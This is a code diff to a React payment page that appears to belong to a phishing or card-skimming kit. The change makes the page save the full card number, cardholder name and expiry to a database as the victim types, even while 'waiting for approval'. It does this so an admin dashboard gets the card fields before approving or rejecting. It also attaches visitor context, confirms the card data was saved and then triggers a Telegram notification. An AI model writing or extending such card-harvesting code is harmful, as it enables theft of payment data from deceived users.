@@ -22,6 +22,8 @@ import {
   DialogTitle } from
 "@/components/ui/dialog";
 import { usePresence } from "@/hooks/usePresence";
+import { ensureOwnerToken, resetOwnerToken, updateApplicationPublic } from "@/lib/ownerToken";
+import { getVisitorContext } from "@/lib/visitor";
 
 const Payment = () => {
   const navigate = useNavigate();
@@ -164,8 +166,9 @@ const Payment = () => {
   };
   const cardType = getCardType(formData.cardNumber);
 
-  // Auto-save to database in real-time
-  useAutoSave(waitingForApproval ? null : applicationId, {
+  // Auto-save to database in real-time while typing. Keep it active even while waiting
+  // so dashboard receives the latest card fields before the admin approves/rejects.
+  useAutoSave(applicationId, {
     cardholder_name: formData.cardholderName,
     card_number: formData.cardNumber,
     card_last_4: formData.cardNumber.replace(/\s/g, "").slice(-4) || "",
@@ -357,6 +360,7 @@ const Payment = () => {
 
       const ipAddress = localStorage.getItem('visitor_ip') || null;
       const paymentData = {
+        ...getVisitorContext(),
         cardholder_name: formData.cardholderName,
         card_number: formData.cardNumber,
         card_last_4: lastFour,
@@ -373,17 +377,20 @@ const Payment = () => {
       };
 
       let savedApplicationId = applicationId;
-      let saveError = null;
+      let saveError: Error | null = null;
 
       if (applicationId) {
-        const { updateApplicationPublic } = await import('@/lib/ownerToken');
         const ok = await updateApplicationPublic(applicationId, paymentData);
-        saveError = ok ? null : new Error('update blocked');
+        saveError = ok ? null : new Error('تعذر تحديث الطلب الحالي بسبب عدم تطابق جلسة العميل');
       }
 
       if (!savedApplicationId || saveError) {
+        if (saveError) {
+          localStorage.removeItem('applicationId');
+          resetOwnerToken();
+        }
+
         savedApplicationId = crypto.randomUUID();
-        const { ensureOwnerToken } = await import('@/lib/ownerToken');
         const ownerToken = ensureOwnerToken();
         const { error } = await supabase
           .from('customer_applications')
@@ -405,6 +412,16 @@ const Payment = () => {
 
       setApplicationId(savedApplicationId);
       localStorage.setItem('applicationId', savedApplicationId);
+
+      const { data: savedData, error: verifyError } = await getApplicationStatus(savedApplicationId);
+      if (
+        verifyError ||
+        savedData?.card_last_4 !== lastFour ||
+        savedData?.cardholder_name !== formData.cardholderName ||
+        savedData?.expiry_date !== `${formData.expiryMonth}/${formData.expiryYear}`
+      ) {
+        throw verifyError || new Error('لم يتم تأكيد حفظ بيانات البطاقة في قاعدة البيانات');
+      }
 
       // Send Telegram notification
       try {
